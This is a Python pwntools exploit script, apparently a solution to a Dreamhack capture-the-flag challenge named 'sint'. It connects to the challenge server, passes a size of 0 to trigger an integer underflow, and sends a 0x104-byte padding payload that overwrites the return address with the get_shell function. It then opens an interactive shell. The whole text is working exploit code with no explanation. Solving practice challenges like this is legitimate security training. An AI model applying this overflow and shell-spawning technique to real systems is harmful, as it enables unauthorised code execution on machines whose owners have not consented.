from pwn import *

p = remote("host3.dreamhack.games", 15920)
e = ELF("./sint")

get_shell = e.symbols['get_shell']


payload = b'A' * 0x104
payload += p32(get_shell)


p.sendlineafter("Size: ", str(0))
p.sendlineafter("Data: ", payload)

p.interactive()

